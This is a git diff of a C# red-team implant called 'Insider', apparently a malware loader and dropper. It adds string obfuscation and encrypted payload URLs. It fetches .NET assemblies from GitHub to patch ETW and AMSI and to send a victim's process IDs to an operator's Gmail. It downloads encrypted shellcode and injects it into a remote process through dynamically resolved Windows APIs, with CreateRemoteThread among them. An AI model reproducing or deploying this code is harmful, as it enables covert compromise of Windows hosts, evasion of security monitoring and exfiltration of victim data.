@@ -1,18 +1,21 @@
-﻿using System;
+using System;
 using System.Reflection;    // For loading .NET assembly in-memory
 using System.Net;           // For usage of WebClient, to receive or send data
 using System.Threading;     // For threading implementation
 using System.Text;          // For string implmentation
-using System.Security.Cryptography;     // For cryptographic AES implementation
-using System.Security.Principal;        // For checking whether user is admin or not
+using System.Security.Cryptography;     // For cryptographic implementation
+using System.Security.Principal;        // For checking (admin. priv of trgt, username of trgt)
 using System.Runtime.InteropServices;   // For PInvoke
-using System.IO;                        // For File Operation
+using System.IO;                        // For memorystream and file operation
 using System.Diagnostics;              // For getting the process component of the currently active process
 
 namespace Insider
 {
     public class Program
     {
+	// global process id variable
+        public static string pid = "";
+	    
         // ========================= Thread Process(shellcode) Injection: Flags and Functions =====================
 
         // ==============================
@@ -128,8 +131,7 @@ namespace Insider
         Int32 nSize,                        // But!, SIZE_T: msdn -> nothing!: specterops -> uint: klezvirus
         out IntPtr lpNumberOfBytesWritten   // But!, [out] SIZE_T  *: msdn -> nothing!: specterops -> UIntPtr: UIntPtr
         );
-        
-        // Marshal.Copy() not working....: see why.... 
+
         */
 
         // source: https://klezvirus.github.io/RedTeaming/Development/From-PInvoke-To-DInvoke/
@@ -197,16 +199,26 @@ namespace Insider
         [Flags]
         public enum AllocationType
         {
+            /*
             MEM_COMMIT = 0x1000,
             MEM_RESERVE = 0x00002000
+            */
+	    // Hiding string name with randon names
+            m_c = 0x1000,
+            m_r = 0x00002000
         }
 
         [Flags]
         public enum MemoryProtection
         {
-	    PAGE_READWRITE = 0x04,
+	     /*
+            PAGE_READWRITE = 0x04,
             PAGE_EXECUTE_READ = 0x20,
             PAGE_EXECUTE_READWRITE = 0x40
+            */
+	    // Hiding string name with randon names
+            RW = 0x04,
+            RX = 0x20
         }
 
         // =============================================== Attached Debugger Detection: Flags and Functions ========================================
@@ -320,24 +332,27 @@ namespace Insider
 
         // =================================================== DECRYPTION OPERATIONS ==============================================
 
-        // Decryption keys:
-        public static byte[] xor_key = Encoding.UTF8.GetBytes("mysecretkeee");          // Xor key      // change
-
-        // global process id variable
-        public static string pid = "";
-
         // Decrypting XOR:
-        public static byte[] XOR_Decrypt(byte[] cipher)
+        public static string XOR_Decrypt(string cipher)
         {
-            byte[] unxored = new byte[cipher.Length];
+            // username: {hostname}\{username}
+            string username = WindowsIdentity.GetCurrent().Name;
+            // xor_key: username
+            string[] xor_key = username.Split('\\');
+            byte[] xor_key_byte = Encoding.UTF8.GetBytes(xor_key[1]);
 
-            for(int i = 0; i < cipher.Length; i++)
+            // b64 decrypt
+            byte[] xored = Convert.FromBase64String(cipher);
+
+            byte[] unxored = new byte[xored.Length];
+
+            for(int i = 0; i < xored.Length; i++)
             {
-                unxored[i] = (byte)(cipher[i] ^ xor_key[i % xor_key.Length]);
+                unxored[i] = (byte)(xored[i] ^ xor_key_byte[i % xor_key_byte.Length]);
             }
 
             //PasteToConsole(unxored);
-            return unxored;
+            return Encoding.UTF8.GetString(unxored);
         }
 
         // Decrypting AES:
@@ -377,29 +392,13 @@ namespace Insider
             return decryptedBytes;
         }
 
-        // Decryption: XOR -> AES
-        // Convertion: aes_xor_byte -xor-> aes_byte -aes-> output (unencrypted) byte
-        public static byte[] AES_XOR_Decrypt(byte[] cipher, byte[] saltBytes, byte[] passwordBytes)
+        // Encryption: AES -> B64
+        // Convertion: b64_aes_byte -aes-> b64_byte -> b64_string -b64-> unencrypted byte
+        public static byte[] AES_B64_Decrypt(string cipher, byte[] saltBytes, byte[] passwordBytes)
         {
-            byte[] aes_byte = XOR_Decrypt(cipher);
+            byte[] aes_byte = Convert.FromBase64String(cipher);
 
-            //Console.WriteLine("HERE: 146");
             byte[] rawshellcode = AES_Decrypt(aes_byte, saltBytes, passwordBytes);
-            //Console.WriteLine("HERE: 148");
-            
-            return rawshellcode;
-        }
-
-        // Encryption: AES -> XOR -> B64
-        // Convertion: b64_xor_aes_byte -aes-> b64_xor_byte -xor-> b64_byte -> b64_string -b64-> unencrypted byte
-        public static byte[] AES_XOR_B64_Decrypt(string cipher, byte[] saltBytes, byte[] passwordBytes)
-        {
-            byte[] aes_xor_byte = Convert.FromBase64String(cipher);
-            //Console.WriteLine("\nBase64 Decoding: ");
-            //Console.WriteLine("------------------");
-            //PasteToConsole(aes_xor_byte);
-
-            byte[] rawshellcode = AES_XOR_Decrypt(aes_xor_byte, saltBytes, passwordBytes);
 
             return rawshellcode;
         }
@@ -445,6 +444,7 @@ namespace Insider
                     /* Unable to download assembly from url or if url server address is down, WebException is raised
                     link: https://docs.microsoft.com/en-us/dotnet/api/system.net.webexception.response?view=net-5.0
                     */
+   
                     catch (WebException) //ex)
                     {
                         Console.Write("\n[!] '{0}' not found yet: [Exception raised!]\t=>\t[!] Please add '{0}' file in the Payload Server\t=>\t", trgtFile);
@@ -476,7 +476,7 @@ namespace Insider
 
 
             // Loader is loading (Performing in-memory execution of .NET binary):
-            public static void Loader(string arg)
+            public static void Loader()
             {
                 if(arg.Equals("1.1"))
                 {
@@ -488,8 +488,8 @@ namespace Insider
 
                     // Loading Assembly no 1: ETW and AMSI patch
 
-                    Console.WriteLine("[>] Start? ");
-                    Console.ReadKey();
+                    //Console.WriteLine("[>] Start? ");
+                    //Console.ReadKey();
 
                     Console.WriteLine("\n============LOADER==============");
 
@@ -499,30 +499,30 @@ namespace Insider
                     
                     Worker remoteWorker1 = (Worker)step1.CreateInstanceAndUnwrap(typeof(Worker).Assembly.FullName, new Worker().GetType().FullName);
                     
-                    // cmd: "encrypt.exe /mscorliburl:https://github.com/reveng007/Executable_Files/raw/main/dotNETbinaries/mscorlib_nointeract.exe /out:aes_xor_b64"
-                    string encryptedlink1 = "7EO9tbrDitekQwMHsvmPrz0OSkIr2clQDchJZPS7gqIVLmqnWKHFeoBSu/vCntUhTsW0yess5oQ1dsQjatmkVjnNm6l6RS3n9ve/DZguVhE7BeuTrlByhLpThIX7EpCD";
+                    // cmd: "encrypt.exe /mscorliburl:https://github.com/reveng007/Executable_Files/raw/main/dotNETbinaries/mscorlib.exe /out:aes_b64"
+					string encryptedlink1 = "gTrO0Nmx76PPJmZi34D8yl58LzZAvKw1YLE6AZfJ59Z+Sw/CNdi2H+Mg3o+p+7BEI7zHrIheg/BeE6FGB6DXMyjbhK5enKFVV6qusQ6L+6z7oVyPx+RFuWUYLzZHfHao";
 
-                    Console.WriteLine("[+] mscorlib URL Decryption Started... ");
+					Console.WriteLine("[+] mscorlib URL Decryption Started... ");
 
-                    // Only For AES Encryption (if required):
-                    // salt and password for url:
-                    byte[] url_saltBytes1 = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };           // AES iv       // change
-                    byte[] url_passwordBytes1 = Encoding.UTF8.GetBytes("word1");             // AES key      // change
+					// Only For AES Encryption (if required):
+					// salt and password for url:
+					byte[] url_saltBytes1 = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };           // AES iv       // change
+					byte[] url_passwordBytes1 = Encoding.UTF8.GetBytes("word1");             // AES key      // change
 
-                    byte[] url_bytes1 = AES_XOR_B64_Decrypt(encryptedlink1, url_saltBytes1, url_passwordBytes1);
+					byte[] url_bytes1 = AES_B64_Decrypt(encryptedlink1, url_saltBytes1, url_passwordBytes1);
 
-                    string url1 = Encoding.UTF8.GetString(url_bytes1);
+					url1 = Encoding.UTF8.GetString(url_bytes1);
 
-                    Console.WriteLine("[>] mscorlib.exe is reflectively loaded from: {0}\n", url1);
+					Console.WriteLine("[>] mscorlib.exe is reflectively loaded from: {0}\n", url1);
 
-                    byte[] programBytes1 = remoteWorker1.WebReflect(url1, 0, 0);
-                    Start(programBytes1);
+					byte[] programBytes1 = remoteWorker1.WebReflect(url1, 0, 0);
+					Start(programBytes1);
 
-                    Console.WriteLine("[+] Appdomain step1 Destroyed!");
-                    AppDomain.Unload(step1);
-                    Console.WriteLine("===============================\n");
-                    //Console.ReadKey();
-
+					Console.WriteLine("[+] Appdomain step1 Destroyed!");
+					AppDomain.Unload(step1);
+					Console.WriteLine("===============================\n");
+					//Console.ReadKey();
+					
                     //==========================================================================NOTE===================================================================
 
                     // Loading Assembly no 2: Sending process ids from victim to Attacker machine via gmail, 
@@ -548,33 +548,33 @@ namespace Insider
 
                     Worker remoteWorker2 = (Worker)step2.CreateInstanceAndUnwrap(typeof(Worker).Assembly.FullName, new Worker().GetType().FullName);
 
-                    // cmd: .\encrypt.exe /remotewriteurl:<url-to-remotewrite.exe> /out:aes_xor_b64
+                    // cmd: .\encrypt.exe /remotewriteurl:<url-to-remotewrite.exe> /out:aes_b64
                     string encryptedlink2 = "Changeit";
 
                     Console.WriteLine("[+] RemoteWrite URL Decryption Started... ");
 
-                    // Only For AES Encryption (if required):
-                    // salt and password for url:
-                    byte[] url_saltBytes2 = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8, 9 };   // AES iv       // change
-                    byte[] url_passwordBytes2 = Encoding.UTF8.GetBytes("word2");        // AES key      // change
+					// Only For AES Encryption (if required):
+					// salt and password for url:
+					byte[] url_saltBytes2 = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8, 9 };   // AES iv       // change
+					byte[] url_passwordBytes2 = Encoding.UTF8.GetBytes("word2");        // AES key      // change
 
-                    byte[] url_bytes2 = AES_XOR_B64_Decrypt(encryptedlink2, url_saltBytes2, url_passwordBytes2);
+					byte[] url_bytes2 = AES_B64_Decrypt(encryptedlink2, url_saltBytes2, url_passwordBytes2);
 
-                    string url2 = Encoding.UTF8.GetString(url_bytes2);
+					url2 = Encoding.UTF8.GetString(url_bytes2);
 
-                    Console.WriteLine("[>] remotewrite.exe is reflectively loaded from: {0}\n", url2);
+					Console.WriteLine("[>] remotewrite.exe is reflectively loaded from: {0}\n", url2);
 
-                    Console.Write("[*] Please Wait...");
+					Console.Write("[*] Please Wait...");
 
-                    byte[] programBytes2 = remoteWorker2.WebReflect(url2, 0, 0);
-                    Start(programBytes2);
+					byte[] programBytes2 = remoteWorker2.WebReflect(url2, 0, 0);
+					Start(programBytes2);
 
-                    Console.WriteLine("     =>      Enumerated ProcessName and corresponding PIDs are to sent to Gmail!");
+					Console.WriteLine("     =>      Enumerated ProcessName and corresponding PIDs are to sent to Gmail!");
 
-                    Console.WriteLine("[+] Appdomain step2 Destroyed!");
-                    AppDomain.Unload(step2);
-                    Console.WriteLine("===============================\n");
-                    //Console.ReadKey();
+					Console.WriteLine("[+] Appdomain step2 Destroyed!");
+					AppDomain.Unload(step2);
+					Console.WriteLine("===============================\n");
+					//Console.ReadKey();
 
                     CheckDebugger();
 
@@ -585,8 +585,8 @@ namespace Insider
 
                     Worker remoteWorker3 = (Worker)step3.CreateInstanceAndUnwrap(typeof(Worker).Assembly.FullName, new Worker().GetType().FullName);
 
-                    // cmd: .\encrypt.exe /remotereadurl:https://raw.githubusercontent.com/reveng007/Executable_Files/main/dotNETbinaries/pid.txt /out:aes_xor_b64
-                    string encryptedlink3 = "57lhltXnKPCCDgbzsqb32DmBVQegaFHyBTWDpzaAdxxSPVGL/80ojUF2dKxz/Wode+p+wPjFhJoN9lCr+YNMVPLnAXvgLVsfTydAjWQ+ATCTiTtvUitwOqwb+GgMC0bB";
+                    // cmd: .\encrypt.exe /remotereadurl:https://raw.githubusercontent.com/reveng007/Executable_Files/main/dotNETbinaries/pid.txt /out:aes_b64
+                    string encryptedlink3 = "Change It";
 
                     Console.WriteLine("\n[+] RemoteRead URL Decryption Started... ");
 
@@ -616,205 +616,177 @@ namespace Insider
                     Console.WriteLine("===============================\n");
 
                     Console.WriteLine("[>] Press any key");
-                    Console.ReadKey();
-                    
-                }
-                else if (arg.Equals("1.2"))
-                {
-                    CheckDebugger();
-
-                    // Adding another appdomain, if you want to...
-
-                    Console.Write("[>] Enter payload link to load: ");
-                    string payload = Console.ReadLine();
-
-                    Console.Write("[>] Name a/another AppDomain to create: ");
-                    string appdomainname = Console.ReadLine();
-
-                    AppDomain appdomains = AppDomain.CreateDomain(appdomainname);
-                    Console.WriteLine("[+] Appdomain {0} created!", appdomainname);
-                    Console.ReadKey();
-
-                    Worker remoteWorker2 = (Worker)appdomains.CreateInstanceAndUnwrap(typeof(Worker).Assembly.FullName, new Worker().GetType().FullName);
-                    remoteWorker2.WebReflect(payload, 0, 0);
-                    Console.ReadKey();
-
-                    Console.WriteLine("[+] Appdomain {0} Destroyed!", appdomainname);
-                    AppDomain.Unload(appdomains);
-                    Console.ReadKey();
+                    Console.ReadKey();   
                 }
             }
 
            // ===================================== DROPPER OPERATIONS ====================================
 
-            public static void Dropper(string arg)
+            public static void Dropper()
             {
+				string url4 = "";
+				
+				CheckDebugger();
 
-                string url4 = "";
-                string kernel = "Kernel32";
+                // mssgbox_x64
+				// mssgbox_x64: Encrypted
+				// cmd: ".\encrypt.exe /shellcodeurl:<url-to-shellcode.txt> /out:aes_b64"
+				string encryptedurl4 = "ChangeIt:ldSm2Dmqnqm+ZHmCUQMlVS6FJW1mE+8dRHiLjJY+dwThi2KV7epjp52xVi1LO4dHX7bDNwAoxrV4prmPRij+rLBnflwaUHN2npIDNYBIMKfSybPFjsboCV6SacqV6N8xkos+Rth22Hn2FQJR1OYcQnpW3gewM3NNVqLDRAWWes=";
 
-                CheckDebugger();
+				Console.WriteLine("\n================DROPPER==================");
+				Console.WriteLine("\n[+] Shellcode URL Decryption Started... ");
 
-                if(arg.Equals("2.1"))
-                {
-                    // mssgbox_x64
-                    // mssgbox_x64: Encrypted
+				// Only For AES Encryption (if required):
+				// salt and password for url:
+				byte[] url_saltBytes4 = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11 };         // AES iv       // change
+				byte[] url_passwordBytes4 = Encoding.UTF8.GetBytes("word4");              // AES key      // change
 
-		            // Creating .bin file and Extracting shellcode from .bin file:
-		            // Creating: https://ivanitlearning.wordpress.com/2018/10/14/shellcoding-with-msfvenom/
-                    // Extract: 
-		            // cmd: ".\encrypt.exe /file:file.bin /out:aes_xor_b64"
-		            // paste the output b64 bytes into a .txt file and upload it to payload server.
-		            // cmd: "mv .\obfuscator\"
-		            // cmd: ".\encrypt.exe /shellcodeurl:<url-to-payloadserver-mssgbox_box.txt> /out:aes_xor_b64"
-                    string encryptedurl4 = "See the above instruction";	// Change it
+				byte[] url_bytes4 = AES_B64_Decrypt(encryptedurl4, url_saltBytes4, url_passwordBytes4);
 
-                    Console.WriteLine("\n================DROPPER==================");
-                    Console.WriteLine("\n[+] Shellcode URL Decryption Started... ");
+				// Encoding.UTF8.GetString : Encoding.ASCII.GetString
+				url4 = Encoding.UTF8.GetString(url_bytes4);
 
-                    // Only For AES Encryption (if required):
-                    // salt and password for url:
-                    byte[] url_saltBytes4 = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11 };         // AES iv       // change
-                    byte[] url_passwordBytes4 = Encoding.UTF8.GetBytes("word4");              // AES key      // change
+				Console.WriteLine("[+] URL: {0}", url4);
 
-                    byte[] url_bytes4 = AES_XOR_B64_Decrypt(encryptedurl4, url_saltBytes4, url_passwordBytes4);
+				// Dealing with HTTPS requests
+				ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
 
-                    // Encoding.UTF8.GetString : Encoding.ASCII.GetString
-                    url4 = Encoding.UTF8.GetString(url_bytes4);
+				WebClient client = new WebClient();
+				client.Headers["User-Agent"] ="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36";
 
-                    Console.WriteLine("[+] URL: {0}", url4);
-                }
-                else
-                {
-                    Console.Write("[>] Enter shellcode link to download: ");
-                    url4 = Console.ReadLine();
+				byte[] shellcode_download = client.DownloadData(url4);
 
-                    Console.WriteLine("[+] URL: {0}", url4);   
-                }
+				// Encoding.UTF8.GetString : Encoding.ASCII.GetString
+				string encryptedshellcode = Encoding.UTF8.GetString(shellcode_download);
 
-                // Dealing with HTTPS requests
-                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
+				Console.WriteLine("\n[+] Shellcode Decryption Started... ");
 
-                WebClient client = new WebClient();
-                client.Headers["User-Agent"] ="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36";
+				// Only For AES Encryption (if required):
+				// salt and password for shellcode:
+				byte[] shellcode_saltBytes5 = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12 };         // AES iv       // change
+				byte[] shellcode_passwordBytes5 = Encoding.UTF8.GetBytes("pass");            // AES key      // change
 
-                byte[] shellcode_download = client.DownloadData(url4);
+				// mssgbox_x64: AES-XOR-b64 decrypted
+				byte[] shellcode = AES_B64_Decrypt(encryptedshellcode, shellcode_saltBytes5, shellcode_passwordBytes5);
 
-                // Encoding.UTF8.GetString : Encoding.ASCII.GetString
-                string encryptedshellcode = Encoding.UTF8.GetString(shellcode_download);
+				// Gettings remote process handle
+				// PInvoke
+				//IntPtr rphandle = OpenProcess(0x1F0FFF, false, Convert.ToUInt32(Program.pid));
 
-                Console.WriteLine("\n[+] Shellcode Decryption Started... ");
+				// delegates
+				//IntPtr funcaddr1 = GetProcAddress(GetModuleHandleA("Kernel32.dll"), "OpenProcess");
 
-                // Only For AES Encryption (if required):
-                // salt and password for shellcode:
-                byte[] shellcode_saltBytes5 = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12 };         // AES iv       // change
-                byte[] shellcode_passwordBytes5 = Encoding.UTF8.GetBytes("pass");            // AES key      // change
+				string k = "OQAECwsLAwI="; // Xor-Base64(Kernel32)
+				string OP = "PRUTCz4VX1NSARY="; // Xor-Base64(OpenProcess)
 
-                // mssgbox_x64: AES-XOR-b64 decrypted
-                byte[] shellcode = AES_XOR_B64_Decrypt(encryptedshellcode, shellcode_saltBytes5, shellcode_passwordBytes5);
+				IntPtr funcaddr1 = GetProcAddress(LoadLibrary(XOR_B64_Decrypt(k)), XOR_B64_Decrypt(OP));
+				oprocess op = (oprocess)Marshal.GetDelegateForFunctionPointer(funcaddr1, typeof(oprocess));
+				IntPtr rphandle = op(0x1F0FFF, false, Convert.ToUInt32(Program.pid));
 
-                // Gettings remote process handle
-                // PInvoke
-                //IntPtr rphandle = OpenProcess(0x1F0FFF, false, Convert.ToUInt32(Program.pid));
+				Console.WriteLine("\n[+] Victim PID: {0}", Program.pid);
 
-                // delegates
-                //IntPtr funcaddr1 = GetProcAddress(GetModuleHandleA("Kernel32.dll"), "OpenProcess");
+				// Allocating a buffer in remote process for payload
+				// PInvoke
+				//IntPtr createdBuffer = VirtualAllocEx(rphandle, IntPtr.Zero, (uint)shellcode.Length, (uint)AllocationType.MEM_COMMIT | (uint)AllocationType.MEM_RESERVE, (uint)MemoryProtection.PAGE_EXECUTE_READWRITE);
 
-                IntPtr funcaddr1 = GetProcAddress(LoadLibrary(kernel), "OpenProcess");
-                oprocess op = (oprocess)Marshal.GetDelegateForFunctionPointer(funcaddr1, typeof(oprocess));
-                IntPtr rphandle = op(0x1F0FFF, false, Convert.ToUInt32(Program.pid));
+				// delegates
+				//IntPtr funcaddr2 = GetProcAddress(GetModuleHandleA("Kernel32.dll"), "VirtualAllocEx");
 
-                Console.WriteLine("\n[+] Victim PID: {0}", Program.pid);
+				string va = "JAwEERsGXHFbHgoVIBY="; // Xor-Base64(VirtualAllocEx)
 
-                // Allocating a buffer in remote process for payload
-                // PInvoke
-                //IntPtr createdBuffer = VirtualAllocEx(rphandle, IntPtr.Zero, (uint)shellcode.Length, (uint)AllocationType.MEM_COMMIT | (uint)AllocationType.MEM_RESERVE, (uint)MemoryProtection.PAGE_EXECUTE_READWRITE);
+				IntPtr funcaddr2 = GetProcAddress(LoadLibrary(XOR_B64_Decrypt(k)), XOR_B64_Decrypt(va));
+				vallocx vax = (vallocx)Marshal.GetDelegateForFunctionPointer(funcaddr2, typeof(vallocx));
+				IntPtr createdBuffer = vax(rphandle, IntPtr.Zero, (UInt32)shellcode.Length, (UInt32)AllocationType.m_c | (UInt32)AllocationType.m_r, (UInt32)MemoryProtection.RW);
+				
+				//Console.WriteLine("[?] PE mapped at     : " + String.Format("{0:X}", (ManMap.ModuleBase).ToInt64()));
 
-                // delegates
-                //IntPtr funcaddr2 = GetProcAddress(GetModuleHandleA("Kernel32.dll"), "VirtualAllocEx");
+				//UInt64 ptr = &createdBuffer;
+				//Console.WriteLine("\n[+] Allocated memory address: ", createdBuffer);
+				//Console.WriteLine("\n[+] Injected Shellcode address (the value at the memory address): ", (*ptr));
+				Console.WriteLine("[+] Allocated memory for the shellcode");
+				Console.ReadKey();
 
-                IntPtr funcaddr2 = GetProcAddress(LoadLibrary(kernel), "VirtualAllocEx");
-                vallocx vax = (vallocx)Marshal.GetDelegateForFunctionPointer(funcaddr2, typeof(vallocx));
-                IntPtr createdBuffer = vax(rphandle, IntPtr.Zero, (UInt32)shellcode.Length, (UInt32)AllocationType.MEM_COMMIT | (UInt32)AllocationType.MEM_RESERVE, (UInt32)MemoryProtection.PAGE_READWRITE);
-                
-                //Console.WriteLine("[?] PE mapped at     : " + String.Format("{0:X}", (ManMap.ModuleBase).ToInt64()));
+				// Copy shellcode to allocated buffer
+				//Marshal.Copy(shellcode, 0, (IntPtr)(createdBuffer), shellcode.Length);
+				IntPtr bytesWritten;
+				//WriteProcessMemory(rphandle, createdBuffer, shellcode, shellcode.Length, out bytesWritten);
 
-                //UInt64 ptr = &createdBuffer;
-                //Console.WriteLine("\n[+] Allocated memory address: ", createdBuffer);
-                //Console.WriteLine("\n[+] Injected Shellcode address (the value at the memory address): ", (*ptr));
-                Console.WriteLine("[+] Allocated memory for the shellcode");
+				// delegate
+				//IntPtr funcaddr3 = GetProcAddress(GetModuleHandleA("Kernel32.dll"), "WriteProcessMemory");
 
-                // Copy shellcode to allocated buffer
-                //Marshal.Copy(shellcode, 0, (IntPtr)(createdBuffer), shellcode.Length);
-                IntPtr bytesWritten;
-                //WriteProcessMemory(rphandle, createdBuffer, shellcode, shellcode.Length, out bytesWritten);
+				string wp = "JRcfEQs3Ql9UFxYFKAsKX0JO"; // Xor-Base64(WriteProcessMemory)
 
-                // delegate
-                //IntPtr funcaddr3 = GetProcAddress(GetModuleHandleA("Kernel32.dll"), "WriteProcessMemory");
+				IntPtr funcaddr3 = GetProcAddress(LoadLibrary(XOR_B64_Decrypt(k)), XOR_B64_Decrypt(wp));
+				WPMemory wpmemory = (WPMemory)Marshal.GetDelegateForFunctionPointer(funcaddr3, typeof(WPMemory));
+				wpmemory(rphandle, createdBuffer, shellcode, Convert.ToInt32(shellcode.Length), out bytesWritten);
 
-                IntPtr funcaddr3 = GetProcAddress(LoadLibrary(kernel), "WriteProcessMemory");
-                WPMemory wpmemory = (WPMemory)Marshal.GetDelegateForFunctionPointer(funcaddr3, typeof(WPMemory));
-                wpmemory(rphandle, createdBuffer, shellcode, Convert.ToInt32(shellcode.Length), out bytesWritten);
+				Console.WriteLine("[+] Wrote Shellcode to the memory address");
 
-                Console.WriteLine("[+] Wrote Shellcode to the memory address");
+				IntPtr hThread = IntPtr.Zero;
 
-                IntPtr hThread = IntPtr.Zero;
+				//PInvoke
+				//bool check = VirtualProtectEx(rphandle, createdBuffer, (UIntPtr) shellcode.Length, 0x40,  /* PAGE_EXECUTE_READ_WRITE */ out uint _);
 
-                //PInvoke
-                //bool check = VirtualProtectEx(rphandle, createdBuffer, (UIntPtr) shellcode.Length, 0x40,  /* PAGE_EXECUTE_READ_WRITE */ out uint _);
+				// delegate
+				//IntPtr funcaddr4 = GetProcAddress(GetModuleHandleA("Kernel32.dll"), "VirtualProtectEx");
 
-                // delegate
-                //IntPtr funcaddr4 = GetProcAddress(GetModuleHandleA("Kernel32.dll"), "VirtualProtectEx");
+				uint oldProtect = 0;
 
-                IntPtr funcaddr4 = GetProcAddress(LoadLibrary(kernel), "VirtualProtectEx");
-                VPEx vpex = (VPEx)Marshal.GetDelegateForFunctionPointer(funcaddr4, typeof(VPEx));
-		// Acc. to https://docs.microsoft.com/en-us/windows/win32/memory/data-execution-prevention#programming-considerations,
-		// Applying page execute read to memory and also see the paragraph where DEP is present, https://dosxuz.gitlab.io/post/earlybird_dinvoke/ (find: DEP).
-                bool check = vpex(rphandle, createdBuffer, (UIntPtr) shellcode.Length, (UInt32)MemoryProtection.PAGE_EXECUTE_READ, out uint _);
+				string vp = "JAwEERsGXGBFHRETBhoiSA=="; // Xor-Base64(VirtualProtectEx)
 
-                if(check == true)
-                {
-                    Console.WriteLine("[+] Permission of the memory region is RX");
-                }
-                else
-                {
-                    Console.WriteLine("[-] Oops! Permission of the memory region isn't RX");
-                    System.Environment.Exit(1);
-                }
+				IntPtr funcaddr4 = GetProcAddress(LoadLibrary(XOR_B64_Decrypt(k)), XOR_B64_Decrypt(vp));
+				VPEx vpex = (VPEx)Marshal.GetDelegateForFunctionPointer(funcaddr4, typeof(VPEx));
+				// Acc. to https://docs.microsoft.com/en-us/windows/win32/memory/data-execution-prevention#programming-considerations,
+				// Applying page execute read to memory and also see the paragraph where DEP is present, https://dosxuz.gitlab.io/post/earlybird_dinvoke/ (find: DEP).
+				bool check = vpex(rphandle, createdBuffer, (UIntPtr) shellcode.Length, (UInt32)MemoryProtection.RX, out oldProtect);
 
-                // If all good, launch the payload
-                //hThread = CreateRemoteThread(rphandle, IntPtr.Zero, 0, createdBuffer, IntPtr.Zero, 0, IntPtr.Zero);
+				if(check == true)
+				{
+					Console.WriteLine("[+] Permission of the memory region is RX");
+				}
+				else
+				{
+					Console.WriteLine("[-] Oops! Permission of the memory region isn't RX");
+					System.Environment.Exit(1);
+				}
 
-                // delegate
-                //IntPtr funcaddr5 = GetProcAddress(GetModuleHandleA("Kernel32.dll"), "CreateRemoteThread");
+				// If all good, launch the payload
+				//hThread = CreateRemoteThread(rphandle, IntPtr.Zero, 0, createdBuffer, IntPtr.Zero, 0, IntPtr.Zero);
 
-                IntPtr funcaddr5 = GetProcAddress(LoadLibrary(kernel), "CreateRemoteThread");
-                CRThread crthread = (CRThread)Marshal.GetDelegateForFunctionPointer(funcaddr5, typeof(CRThread));
-                hThread = crthread(rphandle, IntPtr.Zero, 0, createdBuffer, IntPtr.Zero, 0, IntPtr.Zero);
-                
-                Console.WriteLine("[+] CreateRemoteThread() is called");
+				// delegate
+				//IntPtr funcaddr5 = GetProcAddress(GetModuleHandleA("Kernel32.dll"), "CreateRemoteThread");
 
-                if(hThread != IntPtr.Zero)
-                {
-                    // Waiting infinite amount of time for thread to exit
-                    //PInvoke
-                    //WaitForSingleObject(hThread, 0xFFFFFFFF);
+				string crt = "MRcTBBoCYlVaHRETMQYVVVFT"; // Xor-Base64(CreateRemoteThread)
 
-                    // delegate
-                    //IntPtr funcaddr6 = GetProcAddress(GetModuleHandleA("Kernel32.dll"), "WaitForSingleObject");
+				IntPtr funcaddr5 = GetProcAddress(LoadLibrary(XOR_B64_Decrypt(k)), XOR_B64_Decrypt(crt));
+				CRThread crthread = (CRThread)Marshal.GetDelegateForFunctionPointer(funcaddr5, typeof(CRThread));
+				hThread = crthread(rphandle, IntPtr.Zero, 0, createdBuffer, IntPtr.Zero, 0, IntPtr.Zero);
+				
+				Console.WriteLine("[+] CreateRemoteThread() is called");
 
-                    IntPtr funcaddr6 = GetProcAddress(LoadLibrary(kernel), "WaitForSingleObject");
-                    WFSO wfso = (WFSO)Marshal.GetDelegateForFunctionPointer(funcaddr6, typeof(WFSO));
+				if(hThread != IntPtr.Zero)
+				{
+					// Waiting infinite amount of time for thread to exit
+					//PInvoke
+					//WaitForSingleObject(hThread, 0xFFFFFFFF);
 
-                    wfso(hThread, 0xFFFFFFFF);
+					// delegate
+					//IntPtr funcaddr6 = GetProcAddress(GetModuleHandleA("Kernel32.dll"), "WaitForSingleObject");
 
-                    // Open New thread to continue with the prompt
-                    Console.WriteLine("[+] Thread started successfully!");
-                }
-                else
-                {
-                    Console.WriteLine("[!] Unable to inject shellcode!!! ;(");
-                }
+					string wf = "JQQfESgIQmNeHAIaACEFWlVUBg=="; // Xor-Base64(WaitForSingleObject)
+
+					IntPtr funcaddr6 = GetProcAddress(LoadLibrary(XOR_B64_Decrypt(k)), XOR_B64_Decrypt(wf));
+					WFSO wfso = (WFSO)Marshal.GetDelegateForFunctionPointer(funcaddr6, typeof(WFSO));
+
+					wfso(hThread, 0xFFFFFFFF);
+
+					// Open New thread to continue with the prompt
+					Console.WriteLine("[+] Thread started successfully!");
+				}
+				else
+				{
+					Console.WriteLine("[!] Unable to inject shellcode!!! ;(");
+				}
             }            
 
             // Main Menu:
@@ -823,51 +795,42 @@ namespace Insider
             {
                 CheckDebugger();
 
-                Console.WriteLine("\n");
-                Console.Write(@"[*] Choose serial number [1-4]: 
-1. Loader
-    1.1: Loader: Bypass ETW and AMSI => Fetches .NET payloads from github/remote payload server.
-                 Send Process Ids to Operator's gmail, From where Operator can pick a pid and add that to github
-                 Implant will read from github to perform Process Injection 
-    1.2: Loader: Use Custom payload via external url
-2. Dropper
-    2.1: Dropper: Use embeded shellcode url
-    2.2: Dropper: Use Custom shellcode via external url (External Code designing is needed based on type of shellcode and url)
+				Console.WriteLine("\n");
+				Console.Write(@"[*] Choose serial number [1-4]: 
+1. Loader: Bypass ETW and AMSI => Fetches .NET payloads from github/remote payload server.
+				 Send Process Ids to Operator's gmail, From where Operator can pick a pid and add that to github
+				 Implant will read from github to perform Process Injection 
+2. Dropper: Use embeded shellcode url
 3. To exit
 [>] ");
-                string serialnum = Console.ReadLine();
+				string serialnum = Console.ReadLine();
 
-                return serialnum;
+				return serialnum;
             }
 
             public static void MainOperation()
             {
-                CheckDebugger();
+				CheckDebugger();
 
-                string serialnum = Banner();
+				string serialnum = Banner();
